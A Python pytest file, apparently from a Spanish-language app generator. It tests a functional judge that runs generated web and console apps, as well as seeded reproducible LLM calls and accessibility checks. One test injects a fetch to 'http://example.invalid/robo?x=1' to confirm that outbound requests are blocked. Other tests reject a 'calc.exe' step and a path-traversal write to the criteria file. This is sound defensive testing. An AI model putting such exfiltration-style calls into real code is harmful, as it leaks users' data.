"""Juez funcional dentro de verify (B1) y generación reproducible (B2), PLAN_DEFINITIVO.md."""
import json
import shutil
import subprocess
from pathlib import Path

import pytest

from eolfi import cli, rsi_banco
from eolfi.generador import juez, llm
from eolfi.generador.assist import _allowed, assist
from eolfi.generador.verify import verify
from tests.test_assist import FakeClient, _project

BS = chr(92)
CRITERIOS = {"version": 1, "pagina": "index.html", "pasos": [
    {"escribir": {"selector": "#t", "texto": "comprar pan", "intro": True}},
    {"comprobar": "añade la tarea", "presente": "comprar pan"},
    {"comprobar": "el resumen cuenta 1", "selector": "#resumen", "patron": BS + "b1" + BS + "b"},
    {"comprobar": "clic marca como hecha", "cambia_al_clic": "comprar pan"},
    {"clic": {"selector": "button", "en": "comprar pan"}},
    {"comprobar": "borrar quita la tarea", "ausente": "comprar pan"},
    {"recargar": True},
    {"comprobar": "una sola lista", "selector": "ul", "cuenta": 1},
    {"comprobar": "sin errores de JavaScript", "sin_errores_js": True}]}
HTML = ('<!doctype html><html lang="es"><meta charset="utf-8">'
        '<meta http-equiv="Content-Security-Policy" content="default-src ' + "'self'" + '"><title>t</title>'
        '<main><h1>Tareas</h1><form id="f"><input type="text" id="t" aria-label="Tarea"><button>Añadir</button></form>'
        '<p id="resumen"></p><ul id="l"></ul></main><script src="app.js"></script></html>')
JS = """let ts = JSON.parse(localStorage.getItem('ts') || '[]');
const pinta = () => { localStorage.setItem('ts', JSON.stringify(ts)); const l = document.getElementById('l'); l.replaceChildren();
  ts.forEach((t, i) => { const li = document.createElement('li'); const s = document.createElement('span'); s.textContent = t.x;
    if (t.h) s.style.textDecoration = 'line-through'; s.addEventListener('click', () => { t.h = !t.h; pinta(); });
    const b = document.createElement('button'); b.textContent = 'Borrar'; b.addEventListener('click', () => { BORRAR });
    li.append(s, b); l.append(li); });
  document.getElementById('resumen').textContent = ts.filter((t) => !t.h).length + ' pendientes'; };
document.getElementById('f').addEventListener('submit', (e) => { e.preventDefault(); const i = document.getElementById('t');
  if (i.value.trim()) ts.push({ x: i.value.trim(), h: false }); i.value = ''; pinta(); });
pinta();
"""
con_navegador = pytest.mark.skipif(not shutil.which("node") or juez._playwright() is None,
                                   reason="requiere Node.js y playwright-core")


def _app(d: Path, *, rota: bool = False, extra: str = "") -> Path:
    d.mkdir(parents=True, exist_ok=True)
    (d / "index.html").write_text(HTML, encoding="utf-8")
    (d / "app.js").write_text(JS.replace("BORRAR", "noExiste();" if rota else "ts.splice(i, 1); pinta();") + extra,
                              encoding="utf-8")
    (d / juez.ARCHIVO).write_text(json.dumps(CRITERIOS), encoding="utf-8")
    return d


def test_validar_acepta_lo_declarado_y_rechaza_lo_demas():
    assert juez.validar(CRITERIOS)["pasos"][0]["escribir"]["intro"] is True
    malos = [
        {}, {"version": 2, "pasos": []}, {"version": 1, "pasos": []},
        {"version": 1, "pagina": "../fuera.html", "pasos": [{"comprobar": "x", "presente": "y"}]},
        {"version": 1, "pagina": "app.js", "pasos": [{"comprobar": "x", "presente": "y"}]},
        {"version": 1, "pasos": [{"recargar": True}]},                                  # sin comprobaciones
        {"version": 1, "pasos": [{"comprobar": "x"}]},
        {"version": 1, "pasos": [{"comprobar": "x", "presente": "a", "ausente": "b"}]},
        {"version": 1, "pasos": [{"comprobar": "x", "selector": "p", "patron": "("}]},
        {"version": 1, "pasos": [{"comprobar": "x", "selector": "p", "patron": "\x082\x08"}]},   # «\b» sin duplicar
        {"version": 1, "pasos": [{"comprobar": "x", "selector": "p", "cuenta": "2"}]},
        {"version": 1, "pasos": [{"ejecutar": "calc.exe"}, {"comprobar": "x", "presente": "y"}]},
        {"version": 1, "pasos": [{"comprobar": "x", "presente": "y"}] * (juez.MAX_PASOS + 1)},
    ]
    for malo in malos:
        with pytest.raises(juez.JuezError):
            juez.validar(malo)


def test_paso_sin_criterios_invalidos_destino_y_desactivado(tmp_path, monkeypatch):
    assert juez.paso(tmp_path, "static") is None
    (tmp_path / juez.ARCHIVO).write_text("{no es json", encoding="utf-8")
    p = juez.paso(tmp_path, "static")
    assert p["exit"] == 1 and "inválidos" in p["tail"]
    (tmp_path / juez.ARCHIVO).write_text(json.dumps(CRITERIOS), encoding="utf-8")
    p = juez.paso(tmp_path, "dotnet")
    assert p["exit"] == 1 and "aún no cubre" in p["tail"]              # un juez que no corre no aprueba
    monkeypatch.setattr(juez.shutil, "which", lambda _n: None)
    assert juez.paso(tmp_path, "static")["exit"] == 1
    monkeypatch.setenv("EOLFI_JUEZ", "0")
    p = juez.paso(tmp_path, "static")
    assert p["exit"] == 0 and "NO VERIFICADO" in p["step"]


def test_el_modelo_no_puede_escribir_los_criterios():
    for destino in ("static", "react", "fastapi"):
        assert not _allowed(destino, "eolfi.juez.json")
    assert not _allowed("static", "tests/../eolfi.juez.json")


@con_navegador
def test_juez_real_aprueba_la_app_que_funciona_y_explica_la_rota(tmp_path):
    bien = juez.paso(_app(tmp_path / "bien"), "static")
    assert (bien["exit"], bien["step"]) == (0, "juez funcional (6/6)"), bien["tail"]
    roto = juez.paso(_app(tmp_path / "roto", rota=True), "static")
    assert roto["exit"] == 1 and roto["judge"]["passed"] < 6
    assert "NO: borrar quita la tarea" in roto["tail"] and "noExiste is not defined" in roto["tail"]


@con_navegador
def test_juez_real_corta_las_peticiones_hacia_fuera(tmp_path):
    d = _app(tmp_path / "sale", extra="fetch('http://example.invalid/robo?x=1').catch(() => {});\n")
    # Sin CSP en la página (con ella, el navegador ya corta la petición antes): aquí quien corta es el juez.
    (d / "index.html").write_text(HTML.replace('<meta http-equiv="Content-Security-Policy" content="default-src '
                                               + "'self'" + '">', ""), encoding="utf-8")
    p = juez.paso(d, "static")
    assert p["exit"] == 0, p["tail"]
    assert p["judge"]["peticiones_bloqueadas"] == ["http://example.invalid/robo?x=1"]


def test_verify_no_queda_en_verde_si_el_juez_falla(tmp_path, monkeypatch):
    if not shutil.which("node"):
        pytest.skip("requiere Node.js")
    out = _project(tmp_path)
    assert verify(out, "static")["ok"] and "judge" not in verify(out, "static")
    juez.instalar(out, _criterios(tmp_path))
    notas = iter([{"status": "ok", "total": 6, "passed": 4, "ejecutadas": 6, "seconds": 1,
                   "checks": [{"nombre": "añade la tarea", "ok": False, "detalle": "no aparece"}]},
                  {"status": "ok", "total": 6, "passed": 6, "ejecutadas": 6, "seconds": 1, "checks": []},
                  {"status": "unavailable", "total": 6, "passed": 0, "error": "sin navegador"}])
    monkeypatch.setattr(juez, "juzgar", lambda *a, **k: next(notas))
    v = verify(out, "static")
    assert v["ok"] is False and v["judge"]["passed"] == 4
    assert v["steps"][-1]["step"] == "juez funcional (4/6)" and "NO: añade la tarea (no aparece)" in v["steps"][-1]["tail"]
    assert verify(out, "static")["ok"] is True
    v = verify(out, "static")
    assert v["ok"] is False and "no pudo ejecutarse" in v["steps"][-1]["tail"]


def _criterios(tmp_path) -> Path:
    f = tmp_path / "criterios.json"
    f.write_text(json.dumps(CRITERIOS), encoding="utf-8")
    return f


def test_la_reparacion_ve_que_comprobacion_falla(tmp_path, monkeypatch):
    if not shutil.which("node"):
        pytest.skip("requiere Node.js")
    out = _project(tmp_path)
    juez.instalar(out, _criterios(tmp_path))
    notas = iter([{"status": "ok", "total": 6, "passed": 5, "ejecutadas": 6, "seconds": 1,
                   "checks": [{"nombre": "borrar quita la tarea", "ok": False}]},
                  {"status": "ok", "total": 6, "passed": 6, "ejecutadas": 6, "seconds": 1, "checks": []}])
    monkeypatch.setattr(juez, "juzgar", lambda *a, **k: next(notas))
    html = (out / "index.html").read_text(encoding="utf-8")
    cambio = {"summary": "tareas", "notes": [], "files": [
        {"path": "index.html", "content": html.replace("</main>", "<p>tareas</p></main>")},
        {"path": "eolfi.juez.json", "content": "{}"}]}                       # intento de cambiar los criterios
    cliente = FakeClient([cambio, cambio])
    r = assist(out, "Implementa la lista de tareas", provider=cliente)
    assert r["ok"] and len(r["rounds"]) == 2
    assert r["rounds"][0]["failed_step"] == "juez funcional (5/6)" and "eolfi.juez.json" in r["rounds"][0]["rejected"]
    assert r["rounds"][0]["verification"]["judge"] == {"status": "ok", "passed": 5, "total": 6}
    assert "NO: borrar quita la tarea" in cliente.calls[1]["messages"][-1]["content"]
    assert juez.cargar(out) == juez.validar(CRITERIOS)                       # intactos


def test_create_rechaza_criterios_invalidos_antes_de_empezar(tmp_path, capsys):
    f = tmp_path / "malo.json"
    f.write_text('{"version": 1, "pasos": []}', encoding="utf-8")
    assert cli.main(["--db", str(tmp_path / "x.db"), "create", "--from", str(tmp_path), "--out", str(tmp_path / "o"),
                     "--juez", str(f)]) == 2
    assert "criterios del juez inválidos" in capsys.readouterr().err
    assert not (tmp_path / "o").exists()


# ── B2: generación reproducible ─────────────────────────────────────────────────────────────────────────────────

def test_semilla_solo_cuando_se_pide(monkeypatch):
    monkeypatch.delenv("EOLFI_SEMILLA", raising=False)
    assert llm.semilla() is None and llm.determinista({"temperature": 0.2}) == {"temperature": 0.2}
    monkeypatch.setenv("EOLFI_SEMILLA", "7")
    assert llm.determinista({"temperature": 0.2, "top_p": 0.9}) == {"temperature": 0, "top_p": 0.9, "seed": 7,
                                                                    "cache_prompt": False}   # sin caché: repite
    assert "cache_prompt" not in llm.determinista({"temperature": 0.2}, llama_server=False)
    for malo in ("siete", "-1", str(2**31)):
        monkeypatch.setenv("EOLFI_SEMILLA", malo)
        with pytest.raises(llm.LLMError):
            llm.semilla()


def test_eolas_v1_recibe_semilla_y_temperatura_cero(monkeypatch):
    enviados = []

    def post(url, body, headers, timeout, **kw):
        enviados.append(body)
        return {"message": {"content": '{"summary": "", "notes": [], "files": []}'}}
    monkeypatch.setattr(llm, "_post", post)
    p = llm.EolasV1Provider("http://servidor.invalid:11434", "modelo")
    p.complete("s", [{"role": "user", "content": "x"}], {"type": "object"}, "high")
    monkeypatch.setenv("EOLFI_SEMILLA", "3")
    p.complete("s", [{"role": "user", "content": "x"}], {"type": "object"}, "high")
    assert enviados[0]["options"]["temperature"] == 0.2 and "seed" not in enviados[0]["options"]
    assert (enviados[1]["options"]["temperature"], enviados[1]["options"]["seed"]) == (0, 3)
    assert enviados[1]["options"]["cache_prompt"] is False and "cache_prompt" not in enviados[0]["options"]


def test_el_banco_pasa_criterios_y_semilla_y_anota_el_mejor_intento(monkeypatch):
    vistos = []
    rep = {"assist": {"ok": False, "rounds": [
        {"verification": {"ok": False, "judge": {"status": "ok", "passed": 4, "total": 10}}},
        {"verification": {"ok": False, "judge": {"status": "ok", "passed": 7, "total": 10}}}]}}

    def run(cmd, **kw):
        vistos.append((cmd, kw.get("env", {})))
        return subprocess.CompletedProcess(cmd, 6, "progreso\n" + json.dumps(rep), "")
    monkeypatch.setattr(rsi_banco.subprocess, "run", run)
    notas = []
    assert rsi_banco.banco_tareas(proveedor="eolas-v2", registro=notas.append)(4) == 0.0
    cmd, env = vistos[0]
    assert cmd[cmd.index("--juez") + 1] == str(rsi_banco.CRITERIOS) and env["EOLFI_SEMILLA"] == "4"
    assert notas[0]["mejor_juez_verify"] == "7/10" and notas[0]["rondas"] == 2 and notas[0]["semilla"] == 4
    rsi_banco.banco_tareas(proveedor="eolas-v2", juez_en_verify=False)()
    cmd, env = vistos[1]
    assert "--juez" not in cmd and "EOLFI_SEMILLA" not in {k for k in env if env[k] != __import__("os").environ.get(k)}
    assert sum(1 for p in juez.validar(json.loads(rsi_banco.CRITERIOS.read_text(encoding="utf-8")))["pasos"]
               if "comprobar" in p) == 10


def test_el_banco_congela_la_memoria_de_ejemplos_para_que_los_dos_lados_vean_lo_mismo(monkeypatch, tmp_path):
    """B2, 18/11/2026: la 2.ª corrida de un par veía el ejemplo que guardó la 1.ª; ahora cada una parte de la foto."""
    real = tmp_path / "assist-verified.jsonl"
    real.write_text('{"ejemplo": "anterior"}\n', encoding="utf-8")
    monkeypatch.setenv("EOLFI_ASSIST_MEMORY", str(real))
    vistas = []

    def run(cmd, **kw):
        memoria = Path(kw["env"]["EOLFI_ASSIST_MEMORY"])
        vistas.append(memoria.read_text(encoding="utf-8"))
        with memoria.open("a", encoding="utf-8") as f:   # create en verde guarda un ejemplo nuevo
            f.write('{"ejemplo": "nuevo"}\n')
        return subprocess.CompletedProcess(cmd, 1, "", "falla")
    monkeypatch.setattr(rsi_banco.subprocess, "run", run)
    banco = rsi_banco.banco_tareas(proveedor="eolas-v2")
    banco(0)
    banco(0)
    assert vistas == ['{"ejemplo": "anterior"}\n'] * 2                      # mismo prompt en los dos lados
    assert real.read_text(encoding="utf-8") == '{"ejemplo": "anterior"}\n'   # la memoria real no cambia


# ── Corte por longitud: una ronda fallida, no el fin del trabajo (16/11/2026) ───────────────────────────────────

class _SeCorta(FakeClient):
    """Se corta por longitud las primeras ``cortes`` veces y luego responde."""

    def __init__(self, replies, cortes):
        super().__init__(replies)
        self.cortes = cortes

    def complete(self, system, messages, schema, effort):
        if self.cortes:
            self.cortes -= 1
            self.calls.append({"messages": [dict(m) for m in messages]})
            raise llm.RespuestaCortada("La respuesta de Eolas V2 se cortó por longitud")
        return super().complete(system, messages, schema, effort)


def test_un_corte_por_longitud_es_una_ronda_fallida_y_se_pide_mas_corto(tmp_path):
    if not shutil.which("node"):
        pytest.skip("requiere Node.js")
    out = _project(tmp_path)
    html = (out / "index.html").read_text(encoding="utf-8")
    bueno = {"summary": "ok", "notes": [], "files": [{"path": "index.html", "content": html.replace("</main>", "<p>hecho</p></main>")}]}
    cliente = _SeCorta([bueno], cortes=1)
    r = assist(out, "Añade un párrafo", provider=cliente)
    assert r["ok"] and [x["failed_step"] for x in r["rounds"]] == ["respuesta cortada por longitud", None]
    assert r["rounds"][0]["written"] == []
    turnos = cliente.calls[1]["messages"]
    assert [m["role"] for m in turnos] == ["user"] and "se cortó por longitud" in turnos[0]["content"]
    assert "hecho" in (out / "index.html").read_text(encoding="utf-8")


def test_si_todas_las_rondas_se_cortan_se_restaura_sin_excepcion(tmp_path):
    if not shutil.which("node"):
        pytest.skip("requiere Node.js")
    out = _project(tmp_path)
    original = (out / "index.html").read_text(encoding="utf-8")
    cliente = _SeCorta([], cortes=99)
    r = assist(out, "algo", provider=cliente)
    assert not r["ok"] and r["restored"] and len(r["rounds"]) == 3
    assert (out / "index.html").read_text(encoding="utf-8") == original
    assert cliente.calls[2]["messages"][0]["content"].count("se cortó por longitud") == 1     # la nota no se repite


def test_el_banco_guarda_por_que_fallo_create(monkeypatch):
    def run(cmd, **kw):
        return subprocess.CompletedProcess(cmd, 1, "", "progreso\nAssistError: El motor no responde\n\n")
    monkeypatch.setattr(rsi_banco.subprocess, "run", run)
    notas = []
    assert rsi_banco.banco_tareas(proveedor="eolas-v2", registro=notas.append)(0) == 0.0
    assert notas[0]["exit"] == 1 and notas[0]["error"] == "AssistError: El motor no responde"


A11Y = {"comprobar": "accesible", "sin_problemas_accesibilidad": True}


def test_validar_la_comprobacion_de_accesibilidad():
    assert juez.validar({"version": 1, "pasos": [A11Y]})["pasos"] == [A11Y]
    for malo in (False, "sí", 1):
        with pytest.raises(juez.JuezError):
            juez.validar({"version": 1, "pasos": [{"comprobar": "x", "sin_problemas_accesibilidad": malo}]})


def _con_a11y(d: Path) -> Path:
    (d / juez.ARCHIVO).write_text(json.dumps({**CRITERIOS, "pasos": CRITERIOS["pasos"] + [A11Y]}), encoding="utf-8")
    return d


@con_navegador
def test_juez_real_mide_la_accesibilidad_sin_relajar_la_csp(tmp_path, monkeypatch):
    if juez._axe() is None:
        pytest.skip("requiere axe-core (tests/e2e)")
    bien = juez.paso(_con_a11y(_app(tmp_path / "bien")), "static")
    assert (bien["exit"], bien["step"]) == (0, "juez funcional (7/7)"), bien["tail"]
    # Campo sin etiqueta: axe lo marca como crítico; la página conserva su CSP «default-src 'self'».
    mal = _con_a11y(_app(tmp_path / "mal"))
    (mal / "index.html").write_text(HTML.replace(' aria-label="Tarea"', ""), encoding="utf-8")
    p = juez.paso(mal, "static")
    assert p["exit"] == 1 and p["judge"]["passed"] == 6
    assert "NO: accesible (label (critical" in p["tail"]
    monkeypatch.setenv("EOLFI_AXE", str(tmp_path / "no-hay-axe.js"))
    p = juez.paso(tmp_path / "bien", "static")
    assert p["exit"] == 1 and "axe-core no disponible" in p["tail"] and "NO VERIFICADO" in p["tail"]


@con_navegador
def test_la_plantilla_static_generada_pasa_axe(tmp_path):
    if juez._axe() is None:
        pytest.skip("requiere axe-core (tests/e2e)")
    out = _project(tmp_path)
    (out / juez.ARCHIVO).write_text(json.dumps({"version": 1, "pasos": [
        {"comprobar": "sin errores de JavaScript", "sin_errores_js": True}, A11Y,
        {"clic": {"selector": "[data-theme-toggle]"}},
        {"comprobar": "tema oscuro activo", "selector": "[data-theme-toggle]", "patron": "."},
        {**A11Y, "comprobar": "accesible en tema oscuro"}]}), encoding="utf-8")
    p = juez.paso(out, "static")
    assert p["exit"] == 0, p["tail"]
    assert "accion_fallida" not in p["judge"]


def test_criterios_de_accesibilidad_solos_o_anadidos(tmp_path):
    solos = juez.con_accesibilidad(None)
    assert [p.get("comprobar") for p in solos["pasos"] if "comprobar" in p] == [
        "sin errores de JavaScript", "sin problemas graves de accesibilidad",
        "sin problemas graves de accesibilidad tras cambiar el tema"]
    origen = tmp_path / "c.json"
    origen.write_text(json.dumps(CRITERIOS), encoding="utf-8")
    d = tmp_path / "p"
    d.mkdir()
    data = juez.instalar(d, origen, accesibilidad=True)
    assert data["pasos"][:len(CRITERIOS["pasos"])] == juez.validar(CRITERIOS)["pasos"]
    assert data["pasos"][len(CRITERIOS["pasos"])] == {"recargar": True}
    assert json.loads((d / juez.ARCHIVO).read_text(encoding="utf-8")) == data
    assert juez.instalar(d, origen)["pasos"] == juez.validar(CRITERIOS)["pasos"]


@con_navegador
def test_create_con_accesibilidad_mide_la_plantilla_base(tmp_path):
    if juez._axe() is None:
        pytest.skip("requiere axe-core (tests/e2e)")
    from eolfi.core.evidence import EvidenceStore
    from eolfi.flows.create_flow import create_project
    from tests.fixtures import build_site

    out = tmp_path / "nuevo"
    rep = create_project([str(build_site(tmp_path / "site"))], EvidenceStore(":memory:"), out, name="Bicis",
                         target="static", accesibilidad=True)
    v = rep["verification"]
    assert v["ok"] is True, v["steps"][-1]
    assert [(st["step"], st["exit"]) for st in v["steps"]][-1] == ("juez funcional (3/3)", 0)
    assert (out / juez.ARCHIVO).is_file()


def test_destinos_vite_sin_compilacion_no_aprueban(tmp_path):
    (tmp_path / juez.ARCHIVO).write_text(json.dumps(CRITERIOS), encoding="utf-8")
    for destino in ("react", "vue", "svelte"):
        p = juez.paso(tmp_path, destino)
        assert p["exit"] == 1 and "falta la compilación" in p["tail"] and "dist/index.html" in p["tail"]
    assert "aún no cubre" in juez.paso(tmp_path, "dotnet")["tail"]
    p = juez.paso(tmp_path, "expo")
    assert p["exit"] == 1 and "dist/index.html" in p["tail"] and "npm run build:web" in p["tail"]
    assert "falta la interfaz" in juez.paso(tmp_path, "desktop")["tail"]


@con_navegador
def test_destinos_vite_juzgan_la_compilacion_de_dist(tmp_path):
    # Sin npm install ni red: una «compilación» con la forma de la de Vite (index.html y assets/ con rutas absolutas).
    proyecto = tmp_path / "spa"
    dist = _app(proyecto / "dist")
    (dist / juez.ARCHIVO).unlink()
    (dist / "assets").mkdir()
    (dist / "app.js").rename(dist / "assets" / "index-abc123.js")
    (dist / "index.html").write_text(HTML.replace('src="app.js"', 'type="module" src="/assets/index-abc123.js"'),
                                     encoding="utf-8")
    (proyecto / "index.html").write_text("<!doctype html><title>fuente sin compilar</title>", encoding="utf-8")
    _con_a11y(proyecto)
    for destino in ("react", "vue", "svelte"):
        p = juez.paso(proyecto, destino)
        assert (p["exit"], p["step"]) == (0, "juez funcional (7/7)"), p["tail"]


# Modo servidor (C4): un servidor Node sin dependencias con la forma de la plantilla express (src/server.js, PORT).
SERVIDOR_JS = """import http from 'node:http';
import { readFileSync } from 'node:fs';
const html = readFileSync(new URL('../public/index.html', import.meta.url));
const js = readFileSync(new URL('../public/app.js', import.meta.url));
http.createServer((req, res) => {
  if (req.url === '/' || req.url === '/index.html') { res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' }); return res.end(html); }
  if (req.url === '/app.js') { res.writeHead(200, { 'Content-Type': 'text/javascript' }); return res.end(js); }
  res.writeHead(404); res.end();
}).listen(Number(process.env.PORT), process.env.HOST || '127.0.0.1');
"""


def _servidor(d: Path, js: str = SERVIDOR_JS) -> Path:
    _app(d / "public")
    (d / "public" / juez.ARCHIVO).unlink()
    (d / "src").mkdir(parents=True)
    (d / "src" / "server.js").write_text(js, encoding="utf-8")
    (d / "package.json").write_text('{"type": "module"}', encoding="utf-8")
    return _con_a11y(d)


@con_navegador
def test_juez_arranca_el_servidor_juzga_por_url_y_lo_para(tmp_path, monkeypatch):
    if juez._axe() is None:
        pytest.skip("requiere axe-core")
    import socket

    puertos = []
    real = juez._puerto_libre
    monkeypatch.setattr(juez, "_puerto_libre", lambda: puertos.append(real()) or puertos[-1])
    p = juez.paso(_servidor(tmp_path / "srv"), "express")
    assert (p["exit"], p["step"]) == (0, "juez funcional (7/7)"), p["tail"]
    with socket.socket() as s:                                     # el servidor ya no escucha
        assert s.connect_ex(("127.0.0.1", puertos[0])) != 0


def test_servidor_que_no_arranca_o_no_responde(tmp_path, monkeypatch):
    if not shutil.which("node"):
        pytest.skip("requiere Node.js")
    roto = juez.paso(_servidor(tmp_path / "roto", "throw new Error('arranque roto');\n"), "express")
    assert roto["exit"] == 1 and "terminó con salida" in roto["tail"] and "arranque roto" in roto["tail"]
    monkeypatch.setattr(juez, "ARRANQUE", 2)
    mudo = juez.paso(_servidor(tmp_path / "mudo", "setInterval(() => {}, 1000);\n"), "express")
    assert mudo["exit"] == 1 and "no respondió en 2 s" in mudo["tail"]
    sin_venv = tmp_path / "py"
    sin_venv.mkdir()
    (sin_venv / juez.ARCHIVO).write_text(json.dumps(CRITERIOS), encoding="utf-8")
    for destino in ("fastapi", "django"):
        assert "no está el entorno virtual .venv" in juez.paso(sin_venv, destino)["tail"]
    assert "no está node_modules/next" in juez.paso(sin_venv, "next")["tail"]
    assert "no está bin/app" in juez.paso(sin_venv, "go")["tail"]


def test_create_mide_por_defecto_los_destinos_con_servidor():
    assert set(juez.CUBIERTOS) == {"static", "react", "vue", "svelte", "next", "express", "fastapi", "django", "go",
                                   "desktop", "tauri", "expo", "cli", "rust"}
    assert set(juez.CUBIERTOS) - set(juez.POR_DEFECTO) == {"expo", "cli", "rust"}


@con_navegador
@pytest.mark.parametrize("destino,carpeta", [("desktop", "renderer"), ("tauri", "src")])
def test_escritorio_juzga_la_interfaz_generada_con_axe(tmp_path, destino, carpeta):
    """B1 (18/11/2026): la interfaz real que generan Electron y Tauri pasa el juez y axe en Chrome, sin npm install
    (la carpeta juzgada es la propia fuente)."""
    from eolfi.core.evidence import EvidenceStore
    from eolfi.flows.create_flow import create_project
    from tests.fixtures import build_site

    if juez._axe() is None:
        pytest.skip("requiere axe-core")
    out = tmp_path / destino
    create_project([str(build_site(tmp_path / "site"))], EvidenceStore(":memory:"), out, name="Bicis",
                   target=destino, do_verify=False)
    assert (out / carpeta / "index.html").is_file()
    juez.instalar_accesibilidad(out)
    p = juez.paso(out, destino)
    assert (p["exit"], p["step"]) == (0, "juez funcional (3/3)"), p["tail"]


@con_navegador
def test_expo_juzga_la_version_web_de_dist(tmp_path):
    proyecto = tmp_path / "movil"
    dist = _app(proyecto / "dist")
    (dist / juez.ARCHIVO).unlink()
    _con_a11y(proyecto)
    p = juez.paso(proyecto, "expo")
    assert p["exit"] == 0, p["tail"]


@con_navegador
@pytest.mark.parametrize("destino,modulo", [("fastapi", "uvicorn"), ("django", "django")])
def test_plantillas_con_servidor_reales_pasan_el_juez_y_axe(tmp_path, destino, modulo):
    # Sin red: el .venv del proyecto ve los paquetes de este Python (--system-site-packages).
    import importlib.util
    import sys

    from eolfi.core.evidence import EvidenceStore
    from eolfi.flows.create_flow import create_project
    from tests.fixtures import build_site

    if juez._axe() is None or importlib.util.find_spec(modulo) is None:
        pytest.skip(f"requiere axe-core y {modulo}")
    out = tmp_path / destino
    create_project([str(build_site(tmp_path / "site"))], EvidenceStore(":memory:"), out, name="Bicis",
                   target=destino, do_verify=False)
    subprocess.run([sys.executable, "-m", "venv", "--system-site-packages", str(out / ".venv")], check=True)
    juez.instalar_accesibilidad(out)
    p = juez.paso(out, destino)
    assert (p["exit"], p["step"]) == (0, "juez funcional (3/3)"), p["tail"]


@con_navegador
@pytest.mark.skipif(not shutil.which("go"), reason="requiere Go")
def test_go_real_pasa_la_verificacion_con_el_juez_y_axe(tmp_path):
    """B1 (18/11/2026): create --target go con verificación completa: go vet, test, build, humo y, por defecto, el
    juez con axe sobre el ejecutable compilado (la web va dentro), sin red."""
    from eolfi.core.evidence import EvidenceStore
    from eolfi.flows.create_flow import create_project
    from tests.fixtures import build_site

    if juez._axe() is None:
        pytest.skip("requiere axe-core")
    r = create_project([str(build_site(tmp_path / "site"))], EvidenceStore(":memory:"), tmp_path / "go",
                       name="Bicis", target="go")
    pasos = r["verification"]["steps"]
    assert r["verification"]["ok"], pasos
    assert pasos[-1]["step"] == "juez funcional (3/3)", pasos


def test_el_resumen_del_servidor_conserva_el_error_aunque_la_traza_sea_larga(tmp_path):
    """CI de Windows (17/11): con las rutas largas del runner, «Error: arranque roto» quedaba fuera de los últimos
    400 caracteres y el mensaje solo mostraba la traza."""
    log = tmp_path / "s.log"
    log.write_text("file:///C:/x/src/server.js:1\nthrow new Error('arranque roto');\n\nError: arranque roto\n"
                   + "".join(f"    at file:///C:/Users/runneradmin/AppData/Local/Temp/pytest-of-runneradmin/pytest-0/"
                             f"muy/larga/{i}/src/server.js:1:7\n" for i in range(12)) + "\nNode.js v22.23.4\n",
                   encoding="utf-8")
    resumen = juez._resumen_salida(log)
    assert "Error: arranque roto" in resumen.splitlines()[0] and resumen.endswith("Node.js v22.23.4\n")


# ── Juez de consola: cli y rust (B1, 18/11/2026) ─────────────────────────────────────────────────────────────────
def test_validar_criterios_de_consola():
    ok = juez.validar({"version": 1, "consola": True, "pasos": [
        {"ejecutar": ["info"], "entrada": "x"}, {"comprobar": "sale bien", "codigo": 0},
        {"comprobar": "dice versión", "patron": r"\d+\.\d+"}]})
    assert ok["consola"] is True and "pagina" not in ok
    malos = [
        {"consola": "si", "pasos": [{"ejecutar": []}, {"comprobar": "a", "codigo": 0}]},
        {"consola": True, "pasos": [{"comprobar": "antes de ejecutar", "codigo": 0}]},
        {"consola": True, "pasos": [{"ejecutar": "info"}, {"comprobar": "a", "codigo": 0}]},
        {"consola": True, "pasos": [{"ejecutar": ["info"]}, {"comprobar": "a", "codigo": 300}]},
        {"consola": True, "pasos": [{"ejecutar": ["info"]}, {"comprobar": "a", "codigo": 0, "contiene": "x"}]},
        {"consola": True, "pasos": [{"ejecutar": ["info"]}, {"comprobar": "a", "presente": "x"}]},
        {"consola": True, "pasos": [{"ejecutar": ["info"]}, {"clic": {"selector": "a"}}]},
        {"consola": True, "pasos": [{"ejecutar": ["info"]}]},
        {"consola": True, "pasos": [{"ejecutar": ["in\bfo"]}, {"comprobar": "a", "codigo": 0}]},
    ]
    for m in malos:
        with pytest.raises(juez.JuezError):
            juez.validar({"version": 1, **m})
    with pytest.raises(juez.JuezError, match="consola"):
        juez.con_accesibilidad(ok)


def _consola(d: Path, pasos: list) -> Path:
    d.mkdir(parents=True, exist_ok=True)
    (d / "src" / "demo").mkdir(parents=True)
    (d / "src" / "demo" / "storage.py").write_text('import os\nos.environ.get("DEMO_DATA_DIR")\n', encoding="utf-8")
    (d / juez.ARCHIVO).write_text(json.dumps({"version": 1, "consola": True, "pasos": pasos}), encoding="utf-8")
    return d


def test_juez_de_consola_ejecuta_compara_y_aisla_los_datos(tmp_path, monkeypatch):
    import sys

    # El «programa» es este Python: cada paso le pasa -c con un guion pequeño.
    monkeypatch.setattr(juez, "ejecutable", lambda proyecto, target: Path(sys.executable))
    escribe = "import os,pathlib;d=pathlib.Path(os.environ['DEMO_DATA_DIR']);d.mkdir(exist_ok=True);" \
              "(d/'n.txt').write_text('pan');print('añadido')"
    lee = "import os,pathlib;print((pathlib.Path(os.environ['DEMO_DATA_DIR'])/'n.txt').read_text())"
    p_ok = _consola(tmp_path / "ok", [
        {"ejecutar": ["-c", escribe]}, {"comprobar": "añade", "codigo": 0},
        {"comprobar": "lo dice", "contiene": "añadido"},
        {"ejecutar": ["-c", lee]}, {"comprobar": "persiste entre ejecuciones", "patron": r"^pan\s*$"},
        {"comprobar": "sin trazas", "no_contiene": "Traceback"},
        {"ejecutar": ["-c", "import os;print(os.environ['HOME'])"]},
        {"comprobar": "HOME aislado", "contiene": "eolfi-juez-consola-"},
        {"ejecutar": ["-c", "import sys;print(sys.stdin.read().upper())"], "entrada": "hola"},
        {"comprobar": "lee la entrada", "contiene": "HOLA"}])
    p = juez.paso(p_ok, "cli")
    assert (p["exit"], p["step"]) == (0, "juez funcional (6/6)"), p["tail"]
    # Cada juicio empieza sin datos: el archivo de la vez anterior no está.
    p_rota = _consola(tmp_path / "rota", [
        {"ejecutar": ["-c", lee]}, {"comprobar": "lee algo", "codigo": 0},
        {"ejecutar": ["-c", "import sys;print('hola');sys.exit(3)"]}, {"comprobar": "sale bien", "codigo": 0},
        {"comprobar": "dice adiós", "contiene": "adiós"}])
    p = juez.paso(p_rota, "rust")
    assert p["exit"] == 1 and p["step"] == "juez funcional (0/3)"
    assert "salió con 1" in p["tail"] and "FileNotFoundError" in p["tail"]
    assert "salió con 3" in p["tail"] and "'hola'" in p["tail"]


def test_juez_de_consola_sin_programa_o_con_criterios_cruzados(tmp_path):
    d = _consola(tmp_path / "cli", [{"ejecutar": ["info"]}, {"comprobar": "a", "codigo": 0}])
